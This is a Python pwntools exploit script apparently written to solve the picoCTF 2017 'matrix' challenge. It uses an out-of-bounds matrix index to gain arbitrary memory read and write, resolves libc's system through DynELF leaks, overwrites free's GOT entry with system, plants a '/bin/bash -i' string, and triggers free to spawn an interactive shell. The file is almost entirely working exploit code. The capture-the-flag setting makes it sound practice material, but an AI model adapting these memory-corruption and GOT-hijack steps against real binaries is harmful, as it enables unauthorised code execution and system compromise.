#!/usr/bin/env python

from pwn import *
import sys


if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',16704)
else:
    conn = process('./matrix')
    #gdb.attach(conn)

def float2int(fl):
    return u32(struct.pack('<f',fl))
    
def int2float(intt):
    return struct.unpack('<f',p32(intt))[0]   
    
def create(row, col):
    conn.recvuntil('command: ')
    conn.sendline('create %d %d' % (row, col))
    conn.recvline()
    
def setval(id, row, col, val):
    conn.recvuntil('command: ')
    conn.sendline('set %d %d %d %.9g' % (id, row, col, int2float(val)))
    conn.recvline()
    
def getval(id, row, col):
    conn.recvuntil('command: ')
    conn.sendline('get %d %d %d' % (id, row, col))
    conn.recvuntil(' = '),
    val = conn.recvline()[:-1]
    val = float(val)
    return float2int(val)
    
def destroy(id):
    conn.recvuntil('command: ')
    conn.sendline('destroy %d' % id)
    
 
rows = 7
cols = 5    
create(rows,cols)
create(1,1)

'''
# used for finding proper row and col for exploit
for r in range(rows):
    for c in range(cols):
        log.info('matrix[%d][%d] = 0x%x' % (r, c, getval(0, r, c)))
'''
        
e = ELF('./matrix')

def writeWhatWhere(what ,where):
    setval(0,5,3,where)
    setval(1, 0, 0, what)
    
def leak(addr):
    setval(0,5,3,addr)
    return p32(getval(1, 0, 0))

#1 dynamically resolve system
d = DynELF(leak, e.symbols['main'], elf=e)
system_addr = d.lookup('system', 'libc')
log.success('system_addr @ 0x%x' % system_addr)

#2 overwrite free with system in the .got
writeWhatWhere(system_addr,e.got['free'])

#3 plant /bin/sh at the end of the .got
stage = e.got['calloc'] + 16
writeWhatWhere(u32('/bin'), stage)
writeWhatWhere(u32('/bas'), stage+4)
writeWhatWhere(u32('h -i'), stage+8)
writeWhatWhere(0, stage+12)

#4 put address of /bin/sh as data of matrix id 1 using bug
setval(0,5,3,stage)

#5 free id 1 so that it calls system('bin/sh')
destroy(1)    
conn.interactive(0)